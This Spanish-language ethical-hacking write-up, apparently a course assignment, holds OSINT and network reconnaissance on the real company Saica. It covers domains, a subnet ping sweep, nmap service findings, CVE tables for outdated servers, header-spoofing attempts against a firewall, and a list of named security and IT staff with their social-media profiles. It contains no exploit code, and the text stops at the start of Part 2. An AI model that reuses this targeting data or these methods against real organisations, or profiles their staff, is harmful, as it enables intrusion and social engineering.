# Índice
1. [[writeup#Parte 1 Reconocimiento|Reconocimiento]]
	1. [[writeup#Metodología|Metodología]]
	2. [[writeup#Información recopilada|Información recopilada]]
		1. [[writeup#Actividad|Actividad]]
		2. [[writeup#Infraestructura Web|Infraestructura Web]]
			1. [[writeup#Dominios|Dominios]]
			2. [[writeup#Diagrama y análisis de la infraestructura|Diagrama y análisis de la infraestructura]]
		3. [[writeup#Análisis exhaustivo de las IPs expuestas|Análisis exhaustivo de las IPs expuestas]]
	3. [[writeup#Empleados relevantes|Empleados relevantes]]
2. [[writeup#Parte 2 Pruebas al objetivo|Pruebas al objetivo]]
	1. [[writeup#Análisis automatizado|Análisis automatizado]]
	2. [[writeup#Reconocimiento|Reconocimiento]]
	3. [[writeup#Vulnerabilidades encontradas|Vulnerabilidades encontradas]]
3. [[writeup#Parte 2.1 Escalada|Escalada]]
4. [[writeup#Parte 2.2 Servicios en ejecución|Servicios en ejecución]]
5. [[writeup#Herramientas usadas|Herramientas usadas]]
6. [[writeup#Fuentes|Fuentes]]

<div class="page-break" style="page-break-before: always;"></div>




# Parte 1: Reconocimiento
Para esta primera parte del ejercicio, la empresa escogida es Saica.


## Metodología
Para esta fase el reconocimiento se van a usar una serie de motores de búsqueda y herramientas web, así como redes sociales y programas informáticos para recopilar información útil sobre el objetivo e identificar las componentes de su infraestructura.

Con la información recopilada en la fase anterior se procederá al escaneo minucioso de los activos relevantes hallados, con la meta de identificar con mayor precisión los componentes y sus versiones, tratando de hallar vulnerabilidades.

Por último se hará un pequeño reporte con empleados relevantes y potencial información de dominio público que podría resultar comprometida.


## Información recopilada

### Actividad
La empresa Saica que se dedica fundamentalmente a 4 actividades: Saica Pack (producción de productos de embalaje de cartón ondulado), Saica Flex (productos de embalaje de plástico), Saica Natur (tratamiento y reciclaje de residuos) y Saica Paper (reciclaje y producción de papel). Hay una 5ª sección no tan mencionada llamada Saica Display, que se dedica a producir stands o displays de visibilidad (para exponer productos).

Tras 70 años de su fundación en Zaragoza, Saica tiene más de 12.000 empleados repartidos en España, Francia, Italia, Portugal, Reino Unido, Irlanda, Turquía, Luxemburgo, Holanda y Estados Unidos. Es una de las mayores productoras de papel a nivel Europeo e ingresa anualmente unos 3.700 millones de euros. Ahora mismo esta invirtiendo mayoritariamente en expansión en el mercado estadounidense y los productos de embalaje sostenible basados en plástico.

Durante la búsqueda en fuentes públicas (OSINT) se encuentra información de todo tipo: Documentos internos, analíticas ambientales, concesiones de subvenciones, datos financieros, documentos internos para empleados, denuncias sindicales y análisis de modelo de negocio, así como redes sociales de la empresa. Al ser información legal e industrial se encuentra algo fuera de objetivo de este reconocimiento, pero ha servido para identificar algunos socios comerciales y proveedores que si podrían ser relevantes en caso de compartir infraestructura digital (o en caso de proveer un servicio/producto vulnerable) como Mondelez, FCC, Haarslev o Pontes.
Toda esta información se ha encontrado usando motores de búsqueda al uso com Google, DuckDuckGo o Bing, empleando operadores de búsqueda para filtrar por tipo de archivo, palabras contenidas en la URL, dominio...


<div class="page-break" style="page-break-before: always;"></div>


### Infraestructura Web
#### Dominios
Esta tabla contiene todos los dominios que han podido encontrarse mediante motores de búsqueda (Google, Bing y DuckDuckGo), usando operadores como `site:` o `inurl:`. La tabla consiste de un índice para referenciar el dominio, el propio dominio, la IP asociada, una especulación de la función del software alojado ahí y una sección de notas adicionales.

|     | **Dominio**                | **IP asociada**                | **Uso (probable)**                                                                   | **Notas**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| --- | -------------------------- | ------------------------------ | ------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 0   | saica.com                  | 194.179.125.161                | Dominio principal, actúa como landing page (contacto, info, servicios, productos...) | Madrid, ISP Telefónica, puertos 80 y 443 abiertos                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
|     | **Subominio**              | **IP asociada**                | **Uso (probable)**                                                                   | **Notas**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| 1   | saicanet.saica.com         | 194.179.125.132<br><br>        | Servicio para uso interno                                                            | Tras un reverse proxy f5, servidor BigIP                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| 2   | compliance.saica.com       | 194.179.125.132                | Página para quejas/denuncias internas.                                               | Permite envío anónimo, sin pruebas y desde cualquier país/base                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| 3   | apps.saica.com             | 194.179.125.132                |                                                                                      | Da 403 (no hay permi1so)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| 4   | saica.benefitsatwork.es    | 81.17.209.154                  | Parece una especie de página para canjear premios y otros beneficios                 | Subdominio de Saica de una consultoría Alemana                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| 5   | adgsfs.saica.com           | 194.179.125.173                | Panel de acceso a sistema interno                                                    | Aparentemente es una máquina Microsoft, accesible solo en este [enlace concreto](https://adgsfs.saica.com/adfs/ls/?client-request-id=8916d211-ad42-68be-790c-3bd8bd814cf8&username=&wa=wsignin1.0&wtrealm=urn%3Afederation%3AMicrosoftOnline&wctx=estsredirect%3D2%26estsrequest%3DrQQIARAAjZE7bNNQAEX94sQkUCAwIMaqMIEc_5-dIAYncUrJp_m0TdolOI5f7AbnubZDPhtISFQsnTvCFomFqVRqYWLoFJgQE2OFRIWYMtKIhbF3OLrS3c69R3IJLnWX_ReenpNmEeJow5y3_-LdvBy_8fXWbvrdsTVaePDt6Hlhtg9ivm4besLAzgQsWUHg-imGwf3gKcbdBEbINkwBSvOdwQOdOQBgCsApAJOQDAU5KcOkyELIyVDiBTGBFMHkEW_QUBEFWpRYk24ZHEfDFlJEGbZbumx-D11fVfuBxc-BPXts_gnFEPacpov9YJ98AbJGUMpgtaNpacur99nWDpKKirC5su0VdNVNa9W1brJRHj5r82sVbNOw6rr1Ts1yxY2BulnCmTrqVbZQxx_5_Xxl3MkZA2dHsv2NqlVQiyvJotPYEpxlmGebrW7TUTjXLA-zXptrbgc6FLj0YEJeSOl7kjoX4-DeCUlh1-zZ7WkY_AiDn-EFFqSiUSpO3AaLxCwM3kTO7X9-MovY64vLR-jO27MvEnESYXJGdlBbva81RlZ-xI-RWteQPXrMtplco9yooJzdwVq2VuoN1x8qKW6PAnsUdUjFomScWCIzZe6UAr8p8OoScRi7wH3TK-DTVWJ27Xj39cuDDx9_PfoL0). |
|     | admsfs.saica.com           | 194.179.125.140                | Panel de acceso a sistema interno                                                    | Similar a 5                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| 6   | usa.saica.com              | 194.179.125.132                | Página principal, versión EEUU                                                       | Alojada en el mismo servidor que 2 y 3.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| 7   | vacancies.saica.com        | 54.247.128.77<br>34.252.163.99 | Página de vacantes a cubrir.                                                         | Servidores de AWS (rotación frecuente probable), gestionados por la consultoría de HR Bizneo (probable más servicios externalizados a parte de la contratación)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| 8   | qseportal.saica.com        | 194.179.125.132                | Sistema de gestión de seguridad laboral prosafety                                    |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| 9   | b2bpaper.saica.com         | 194.179.125.132                | Panel de acceso para negocios                                                        | Panel de control para negocios, pedidos al por mayor(probable)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| 10  | b2bpapertest.ext.saica.com | 194.179.125.143                | Panel de acceso para negocios                                                        | Servidor distinto que 9, sufijo .ext que siguiere externo (?), BigIP server                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| 11  | packb2b.saica.com          | 13.80.45.58                    | Panel de acceso para negocios (servicio Saica Pack)                                  | Servidor neerlandés, alojado en Azure, gestionado/hecho por SAP (software gestión empresas)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| 12  | campusonline.saica.com     | 52.178.145.71                  | Plataforma de formación interna                                                      | Servicio SSH expuesto en el puerto 2222, alojado en Azure en Dublin                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| 13  | graduate.saica.com         | 54.247.128.77                  | Plataforma de ofertas para recién graudados                                          | Mismo servidor que 7, también gestionada por Bizneo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| 14  | naturlca.saica.com         | 167.99.19.207                  |                                                                                      | SSH expuesto, tres vulnerabilidades listadas por Shodan, Nginx en Ubuntu. CP DigitalOcean.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| 15  | maximowas.saica.com        | 194.179.125.132                |                                                                                      | Login HTTPAuth                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| 16  | fundacion.saica.com        | 194.179.125.132                | Página de la fundación Saica                                                         |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| 17  | 2025.saica.com             | 194.179.125.132                |                                                                                      |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| 18  | saica.puntes.es            | 18.100.3.222                   | Panel de gestión con socio comercial                                                 | Puntes es un proveedor de packaging, servidor AWS en Zaragoza                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| 19  | mypassword.saica.com       | 194.179.125.132                | Funcionalidad de recuperación de contraseñas                                         |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
<div class="page-break" style="page-break-before: always;"></div>

#### Diagrama y análisis de la infraestructura
Analizando la lista se cruzan fuentes de las herramientas `whois`, `nslookup` y el motor de búsqueda Shodan, y se elabora el gráfico bajo este párrafo.
Se identifica con la información obtenida que varios de los dominios de Saica están alojados en servidores de distintos cloud providers (AWS y Azure) y están registrados a nombre de otras empresas. De esto se deduce que esos servidores/dominios no forman parte de la infraestructura de Saica y son más bien servicios que le se le proveen a esta (mayormente RRHH) o bien paneles de control para interactuar con socios comerciales.
Sin embargo, todas las IPs que si aparecen como registradas a nombre de Saica se encuentran dentro de un rango: 194.179.125.0/24. De esta información se asume que toda la infraestructura web de Saica (o al menos la accesible desde Internet) se encuentra en una misma subnet.

![[saica.jpg]]

Al hacer un `whois` en el rango 194.179.125.0/24 nos confirma lo que ya sabemos, el ISP es telefónica. Inspeccionando una por una las IPs combinando `ping` y `whois`, se observa que tienen un rango de IPs en este servidor que va desde 194.179.125.128 hasta 194.179.125.191, de modo que la subnet de Saica es realmente 194.179.125.128/26. Casi con total seguridad se trata de una subnet virtual contenida en algún servicio de cloud de Telefónica.
Muchas de las IPs no son accesibles, probablemente por desuso o uso interno, analizándolas una por una nos queda la siguiente lista que mereca la pena investigar más a fondo.

Lista deducida a base de un script que lanza un `ping` a todas las IPs en el rango 194.179.125.128/26 y evalúa si responden o no:

```
194.179.125.130, 194.179.125.132, 194.179.125.143, 194.179.125.144, 194.179.125.152, 194.179.125.154, 194.179.125.155, 194.179.125.156, 194.179.125.157, 194.179.125.158, 194.179.125.160, 194.179.125.161, 194.179.125.165, 194.179.125.166, 194.179.125.167, 194.179.125.168, 194.179.125.169, 194.179.125.174, 194.179.125.175, 194.179.125.177, 194.179.125.178, 194.179.125.186, 194.179.125.187, 194.179.125.188, 194.179.125.191
```

<div class="page-break" style="page-break-before: always;"></div>

### Análisis exhaustivo de las IPs expuestas
Se desarrolla un script para realizar un escaneo vía `nmap` de cada una de las IPs recopiladas para un análisis más profundo. [Código fuente](https://github.com/galizaragoza/sec_tools/blob/main/nmapper.sh)
Se analizan los resultados de las distintas IPs uno por uno y se filtra la información relevante. Los siguientes apartados analizando las IPs uno por uno tienen la siguiente información
- Captura de pantalla del escaneo generado por nmap
- Hipótesis del propósito del servidor 
- Información sobre los servicios
- CVEs (de haberlas)

> Varias de las IPs en el diagrama son inaccesibles con peticiones directas a la IP a la que están asociadas, en concreto 194.179.125.140, 194.179.125.143 y 194.179.125.161. Están fuera de la lista ya que no se pudo averiguar información relevante sobre ellas desde Nmap, curl o Shodan con distintos métodos, se asume que F5 BigIP las proteje, ya que saica.com es perfectamente accesible pero 194.179.125.161(su IP) no.

<div class="page-break" style="page-break-before: always;"></div>

#### 194.179.125.130 / mail-out4.saica.com
![[194.179.125.130.png]]

A juzgar por el dominio asociado a esta IP, podría tratarse de un servidor relacionado con mailing. Basándome en la información de los puertos es una teoría con bastante sentido, y se respalda en la presencia de un firewall cuyo propósito sea probablemente filtrar el tráfico de mail saliente (por la parte `-out` del dominio).
- El puerto 264 está corriendo un Firewall, [CheckPoint](https://sc1.checkpoint.com/documents/Infinity_Portal/WebAdminGuides/EN/SASE-Admin-Guide/Content/Topics-SASE-IPsec-VPN/On-premises/CheckPoint.htm) es un vendedor de software y en el caso de este servidor ambos servicios son de este proveedor. Investigando sobre el producto señalado por nmap se descubre que FireWall-1 se trata de una versión concreta de este proveedor.
- El puerto 18264 aloja un servicio del mismo vendedor, en este caso un SVN (un software de control de versiones OpenSource hecho por Apache), que tras leer un poco la documentación de CheckPoint deduzco que es consumido por el propio software de CheckPoint, quizá para descargar actualizaciones.

> El mismo servicio en el mismo puerto corre también en la IP 194.179.125.177

<div class="page-break" style="page-break-before: always;"></div>

#### 194.179.125.132
![[194.179.125.132.png]]

Esta IP aloja servicios de load balancing y varias páginas de administración internas, es la IP detrás de la mayoría de los dominios en el diagrama [[writeup#Diagrama y análisis de la infraestructura|infraestructura]], así que casi con total seguridad este servidor contiene o bien virtual hosts, contenedores o VMs a las que se enruta el tráfico en función de la dirección solicitada.
- El puerto 80 actúa como load balancer, del vendedor f5, podría estar gestionado por telefónica, ya que el nombre del dominio sugiere que aquí se definen ciertos parámetros en la infraestructura del telefónica sobre como se aprovisionan los recursos a Saica, los dos load balancers en los puertos 80 y 443 podrían ser lo que enruta el tráfico por todo el resto de la subnet de Saica.
- En el puerto 443 hay un servicio muy similar al del puerto 80, solo que con un certificado SSL. F5 tiene un servicio de Load Balancing y DNS así que se asume que o bien Telefónica o Saica consumen este servicio.
- En el puerto 1080 hay un panel de login a una interfaz de control interna de Node-RED (una herramienta de desarrollo basada en flujo para programación visual desarrollada originalmente por IBM para conectar dispositivos de hardware, API y servicios en línea como parte de IoT). Esto respalda la teoría de que esta IP es de la configuración de la nube de Saica ya que esto podría servir para configurar dispositivos virtuales. O bien podría ser algo interno de Saica para monitorizar su infraestructura IoT.
- El puerto 8088 aloja un panel de administración de activos. Está corriendo en Ubuntu con Nginx 1.14.0 (Apr. 2018, vulnerable) y el título HTTP es com.kyubi.warehouse.inventory.webapp.ui. Kyuubi es un producto de Apache para gestionar inventarios de almacenes.

Tabla con CVEs de Nginx 1.14.0:

| **CVE**        | **CVSS** | **NIST Link**                                   |
| -------------- | -------- | ----------------------------------------------- |
| CVE-2018-16845 | 8.2      | https://nvd.nist.gov/vuln/detail/cve-2018-16845 |
| CVE-2018-16843 | 7.8      | https://nvd.nist.gov/vuln/detail/cve-2018-16843 |
| CVE-2018-16844 | 7.8      | https://nvd.nist.gov/vuln/detail/cve-2018-16844 |
| CVE-2019-9511  | 7.8      | https://nvd.nist.gov/vuln/detail/cve-2019-9511  |
| CVE-2019-9513  | 7.8      | https://nvd.nist.gov/vuln/detail/cve-2019-9513  |
| CVE-2021-23017 | 7.7      | https://nvd.nist.gov/vuln/detail/cve-2021-23017 |
| CVE-2019-9516  | 7.5      | https://nvd.nist.gov/vuln/detail/cve-2019-9516  |
| CVE-2023-44487 | 7.5      | https://nvd.nist.gov/vuln/detail/cve-2023-44487 |
| CVE-2021-3618  | 7.4      | https://nvd.nist.gov/vuln/detail/cve-2021-3618  |
| CVE-2024-7347  | 5.7      | https://nvd.nist.gov/vuln/detail/cve-2024-7347  |
| CVE-2019-20372 | 5.3      | https://nvd.nist.gov/vuln/detail/cve-2019-20372 |
| CVE-2025-23419 | 5.3      | https://nvd.nist.gov/vuln/detail/cve-2025-23419 |

<div class="page-break" style="page-break-before: always;"></div>

#### 194.179.125.144
![[194.179.125.144.png]]

- Puerto 2020 servidor de control XINU (SO para sistemas embebidos), probablemente de control o monitorización para IoT o controladores industriales
- Puerto 8443 protegido por firewall solo responde con tcpwrapped (un firewall esta protegiendo la aplicación tras el puerto). Al probar con un un escaneo menos intrusivo (`nmap -p 8443 -T3 -sT -v -Pn 194.179.125.144`), nmap saca un servicio llamado `https-alt`, pero al tratar de hacer peticiones vía `curl` el firewall bloquea de nuevo(`curl: (56) Recv failure: Connection reset by peer`), por lo que se asume que hay una whitelist en la que no estamos.

<div class="page-break" style="page-break-before: always;"></div>

#### 194.179.125.152, 168, 169
![[194.179.125.152.png]]

- En el puerto 443 tenemos un servidor HTTPS corriendo en Apache 2.4.37 (Oct. 2018, vulnerable).

CVEs de Apache 2.4.37

| **CVE**        | **CVSS** | **NIST Link**                                   |
| -------------- | -------- | ----------------------------------------------- |
| CVE-2020-11984 | 9.8      | https://nvd.nist.gov/vuln/detail/cve-2020-11984 |
| CVE-2021-26691 | 9.8      | https://nvd.nist.gov/vuln/detail/cve-2021-26691 |
| CVE-2021-39275 | 9.8      | https://nvd.nist.gov/vuln/detail/cve-2021-39275 |
| CVE-2021-44790 | 9.8      | https://nvd.nist.gov/vuln/detail/cve-2021-44790 |
| CVE-2022-22720 | 9.8      | https://nvd.nist.gov/vuln/detail/cve-2022-22720 |
| CVE-2022-23943 | 9.8      | https://nvd.nist.gov/vuln/detail/cve-2022-23943 |
| CVE-2022-31813 | 9.8      | https://nvd.nist.gov/vuln/detail/cve-2022-31813 |
| CVE-2023-25690 | 9.8      | https://nvd.nist.gov/vuln/detail/cve-2023-25690 |
| CVE-2024-38474 | 9.8      | https://nvd.nist.gov/vuln/detail/cve-2024-38474 |
| CVE-2024-38476 | 9.8      | https://nvd.nist.gov/vuln/detail/cve-2024-38476 |
| CVE-2019-10082 | 9.1      | https://nvd.nist.gov/vuln/detail/cve-2019-10082 |
| CVE-2022-22721 | 9.1      | https://nvd.nist.gov/vuln/detail/cve-2022-22721 |
| CVE-2022-28615 | 9.1      | https://nvd.nist.gov/vuln/detail/cve-2022-28615 |
| CVE-2024-38475 | 9.1      | https://nvd.nist.gov/vuln/detail/cve-2024-38475 |
| CVE-2024-40898 | 9.1      | https://nvd.nist.gov/vuln/detail/cve-2024-40898 |
| CVE-2025-23048 | 9.1      | https://nvd.nist.gov/vuln/detail/cve-2025-23048 |
| CVE-2021-40438 | 9.0      | https://nvd.nist.gov/vuln/detail/cve-2021-40438 |
| CVE-2022-36760 | 9.0      | https://nvd.nist.gov/vuln/detail/cve-2022-36760 |
| CVE-2025-58098 | 8.3      | https://nvd.nist.gov/vuln/detail/cve-2025-58098 |
| CVE-2021-44224 | 8.2      | https://nvd.nist.gov/vuln/detail/cve-2021-44224 |
| CVE-2024-38473 | 8.1      | https://nvd.nist.gov/vuln/detail/cve-2024-38473 |
| CVE-2019-0211  | 7.8      | https://nvd.nist.gov/vuln/detail/cve-2019-0211  |
| CVE-2019-9517  | 7.8      | https://nvd.nist.gov/vuln/detail/cve-2019-9517  |
| CVE-2006-20001 | 7.5      | https://nvd.nist.gov/vuln/detail/cve-2006-20001 |

> Se han incluido las IPs 168 y 169 por tener patrones idénticos o muy similares

<div class="page-break" style="page-break-before: always;"></div>

#### 194.179.125.154
![[194.179.125.154.png|873x542]]

De nuevo, tanto el contenido del puerto 80 como el 443 está tras el producto BigIP, que parece estar actuando también como firewall además de load balancer, ya que bloquea con este mensaje

![[bigIP_firewall.png|248x328]]

Dando a entender que hay una whitelist o un paso previo que da credenciales de las que carezco. Se asume que todos los servidores tras esta protección son interfaces internas de gestión ya que además no tienen dominio asociado.

<div class="page-break" style="page-break-before: always;"></div>

#### 194.179.125.155
![[194.179.125.155.png]]

De nuevo el puerto 80 está protegido por BigIP, en el 443 está corriendo el servicio HTTPAPI, lo que significa que la máquina tras él es casi con total seguridad Windows, pero la versión no es vulnerable. Según nmap está corriendo UPnP, un protocol de red para oficinas pequeñas.

<div class="page-break" style="page-break-before: always;"></div>

#### 194.179.125.156
![[194.179.125.156.png|963x557]]

En los puertos 25 y 110, dos servidores de mailing (SMTP y POP3) corriendo en Windows desactualizado, no se consigue fingerprintear el puerto 25, pero si el 110 con este comando: `nmap -p 25,110 -sTV -T2 194.179.125.156`. Resulta ser una version vulnerable a [cve-2020-0688](https://nvd.nist.gov/vuln/detail/cve-2020-0688).
Por otro lado, el puerto 443 está bloqueado tras el firewall de nuevo.

<div class="page-break" style="page-break-before: always;"></div>

#### 194.179.125.160
![[194.179.125.160.png]]

En esta máquina solo hay expuesto un servidor SSH en el puerto 22, en concreto, la versión 9.2 para Windows, Nmap también es capaz de averiguar con alta precisión la versión del OS (Windows Server 2019), que tiene 4066 vulnerabilidades que se pueden consultar en [este enlace](https://www.cvedetails.com/vulnerability-list/vendor_id-26/product_id-50662/Microsoft-Windows-Server-2019.html?page=1&order=3), las cuales no listo aquí debido a la imposibilidad de verificar con un mínimo de rigor. Si están en la tabla de abajo, sin embargo, las vulnerabilidades públicas de esta versión de OpenSSH.

| **CVE**        | **CVSS** | **NIST Link**                                   |
| -------------- | -------- | ----------------------------------------------- |
| CVE-2024-6387  | 8.1      | https://nvd.nist.gov/vuln/detail/cve-2024-6387  |
| CVE-2024-39894 | 7.5      | https://nvd.nist.gov/vuln/detail/cve-2024-39894 |
| CVE-2025-26465 | 6.8      | https://nvd.nist.gov/vuln/detail/cve-2025-26465 |
| CVE-2023-51385 | 6.5      | https://nvd.nist.gov/vuln/detail/cve-2023-51385 |
| CVE-2023-48795 | 5.9      | https://nvd.nist.gov/vuln/detail/cve-2023-48795 |
| CVE-2025-26466 | 5.9      | https://nvd.nist.gov/vuln/detail/cve-2025-26466 |
| CVE-2023-51384 | 5.5      | https://nvd.nist.gov/vuln/detail/cve-2023-51384 |
| CVE-2025-32728 | 4.3      | https://nvd.nist.gov/vuln/detail/cve-2025-32728 |
| CVE-2025-61984 | 3.6      | https://nvd.nist.gov/vuln/detail/cve-2025-61984 |
| CVE-2025-61985 | 3.6      | https://nvd.nist.gov/vuln/detail/cve-2025-61985 |

<div class="page-break" style="page-break-before: always;"></div>

#### 194.179.125.165, 167, 168
![[194.179.125.165.png]]

- 443: Servidor HTTPS inaccesible
- 4172: Servicio PCoIP (control remoto de máquinas físicas y virtuales)
- 8443: Otro servidor HTTPS inaccesible, dado que responde con `Missing Host header` se prueba a mandar una request con headers como `Host: localhost`, `X-Forwarded-For: 127.0.0.1` y `X-Originating-IP: 127.0.0.1` pero en ninguno responde, se asume firewall.

> Se han incluido las direcciones 167 y 168 en este apartado ya que tienen patrones idénticos o muy similares

<div class="page-break" style="page-break-before: always;"></div>

#### 194.179.125.174
![[CS/Ciberseguridad/Writeups/26.1_enero/1_Hacking_Etico_Final/(imgs)/194.179.125.174.png]]

- 5061: Servicio SIP (Session Initiation Protocol), por el contexto corporativo/industrial y el producto (Tandberg-4145 VoIP server), se trata evidentemente de un servidor VoIP (Voice over IP), se trata de un servicio de Cisco para videoconferencias. La versión, X14.2.5, es vulnerable

| **CVE**        | **CVSS** | **NIST Link**                                   |
| -------------- | -------- | ----------------------------------------------- |
| CVE-2024-20252 | 9.6      | https://nvd.nist.gov/vuln/detail/cve-2024-20252 |
| CVE-2024-20254 | 9.6      | https://nvd.nist.gov/vuln/detail/cve-2024-20254 |
| CVE-2024-20255 | 8.2      | https://nvd.nist.gov/vuln/detail/cve-2024-20255 |
| CVE-2023-44487 | 7.5      | https://nvd.nist.gov/vuln/detail/cve-2023-44487 |
| CVE-2024-20492 | 6.7      | https://nvd.nist.gov/vuln/detail/cve-2024-20492 |
| CVE-2024-20497 | 4.3      | https://nvd.nist.gov/vuln/detail/cve-2024-20497 |
- 5062: El servicio encontrado por Nmap es na-localise, sobre el que no hay mucha información, por lo leído en Internet parece ser un proceso auxiliar a el servidor VoIP

<div class="page-break" style="page-break-before: always;"></div>

#### 194.179.125.175
![[194.179.125.174 1.png]]

Esta IP tiene un puerto 5061 idéntico al anterior, con la diferencia del puerto 8443, que aloja un servidor HTTP asociado al servicio Cisco Expressway E, que es el nombre de la serie de productos entre los que se encuentra el Tandberg-4145, probablemente se trata de una interfaz web de gestión de dicho servicio.

<div class="page-break" style="page-break-before: always;"></div>

#### 194.179.125.186, 187
![[194.179.125.187.png]]

En esta IP tenemos al culpable del problema mencionado en la nota del inicio de la sección, ya casi con total seguridad es lo que estaba bloqueando la inspección más minuciosa y el acceso mediante la IP a muchos recursos de la red interna de Saica. El producto en cuestión es potencialmente vulnerable (no se pudo averiguar la versión, así que esto no es 100% seguro), basándome en las versiones de otros servicios de la infraestructura (~2018), es muy probable que algunas de las vulnerabilidades más graves sean explotables.

| **CVE**        | **CVSS** | **NIST Link**                                   |
| -------------- | -------- | ----------------------------------------------- |
| CVE-2018-0101  | 10.0     | https://nvd.nist.gov/vuln/detail/cve-2018-0101  |
| CVE-2019-1713  | 9.3      | https://nvd.nist.gov/vuln/detail/cve-2019-1713  |
| CVE-2018-0228  | 8.6      | https://nvd.nist.gov/vuln/detail/cve-2018-0228  |
| CVE-2018-15388 | 8.6      | https://nvd.nist.gov/vuln/detail/cve-2018-15388 |
| CVE-2019-1694  | 8.6      | https://nvd.nist.gov/vuln/detail/cve-2019-1694  |
| CVE-2019-15256 | 8.6      | https://nvd.nist.gov/vuln/detail/cve-2019-15256 |
| CVE-2024-20260 | 8.6      | https://nvd.nist.gov/vuln/detail/cve-2024-20260 |
| CVE-2025-20133 | 8.6      | https://nvd.nist.gov/vuln/detail/cve-2025-20133 |
| CVE-2025-20134 | 8.6      | https://nvd.nist.gov/vuln/detail/cve-2025-20134 |
| CVE-2025-20136 | 8.6      | https://nvd.nist.gov/vuln/detail/cve-2025-20136 |
| CVE-2025-20239 | 8.6      | https://nvd.nist.gov/vuln/detail/cve-2025-20239 |
| CVE-2025-20243 | 8.6      | https://nvd.nist.gov/vuln/detail/cve-2025-20243 |
| CVE-2025-20253 | 8.6      | https://nvd.nist.gov/vuln/detail/cve-2025-20253 |
| CVE-2025-20263 | 8.6      | https://nvd.nist.gov/vuln/detail/cve-2025-20263 |
| CVE-2025-20251 | 8.5      | https://nvd.nist.gov/vuln/detail/cve-2025-20251 |
| CVE-2018-15465 | 8.1      | https://nvd.nist.gov/vuln/detail/cve-2018-15465 |
| CVE-2011-0379  | 7.9      | https://nvd.nist.gov/vuln/detail/cve-2011-0379  |
| CVE-2019-1687  | 7.8      | https://nvd.nist.gov/vuln/detail/cve-2019-1687  |
| CVE-2019-1697  | 7.8      | https://nvd.nist.gov/vuln/detail/cve-2019-1697  |
| CVE-2019-1945  | 7.8      | https://nvd.nist.gov/vuln/detail/cve-2019-1945  |
| CVE-2019-1693  | 7.7      | https://nvd.nist.gov/vuln/detail/cve-2019-1693  |
| CVE-2019-12677 | 7.7      | https://nvd.nist.gov/vuln/detail/cve-2019-12677 |
| CVE-2025-20244 | 7.7      | https://nvd.nist.gov/vuln/detail/cve-2025-20244 |
| CVE-2018-0296  | 7.5      | https://nvd.nist.gov/vuln/detail/cve-2018-0296  |
| CVE-2022-20866 | 7.5      | https://nvd.nist.gov/vuln/detail/cve-2022-20866 |

<div class="page-break" style="page-break-before: always;"></div>

## Empleados relevantes
### Susana Alejandro Balet - Presidente y CEO
[LinkedIn](https://www.linkedin.com/in/susana-alejandro-balet-711a81252)
- Parte de familia Balet (copropietaria de Saica)
- Licenciada en ADE por Unizar

### Jose Luis Cubero - IT
[LinkedIn](https://www.linkedin.com/in/joselcubero/), [Pinterest](https://es.pinterest.com/cuberobiedma/)
- Licenciado en UNIR en ingeniería informática
- En Saica desde Abril de 2001

### Javier Boudet - SOC Manager
[LinkedIn](https://www.linkedin.com/in/javierboudet/), [X](https://x.com/javierboudet)
- En Saica desde Agosto de 2016
- Licenciado en seguridad informática por UNIR y el ingeniería informática por la universidad de Gales

### Pablo Yosu Alejandro Leonet - Cybersecurity Analyst
[LinkedIn](https://www.linkedin.com/in/palejandroleonet/)
- Licenciado en ingeniería informática por grupo San Jorge
- En Saica desde Marzo de 2025

### José Enrique Martínez - CISO
[LinkedIn](https://www.linkedin.com/in/jose-enrique-martinez/)
- En Saica desde el año 2000
- Licenciado en ingeniería de telecomunicaciones y MBA por Unizar y la Universidad de Comillas (respectivamente)

### Federico Asensio Balet - CTO
[LinkedIn](https://www.linkedin.com/in/federico-asensio-balet/)
- Miembro de la familia Balet (fundadores de Saica)
- En Saica desde 1999
- Licenciado en ingeniería mecánica por Unizar


<div class="page-break" style="page-break-before: always;"></div>


# Parte 2: Pruebas al objetivo
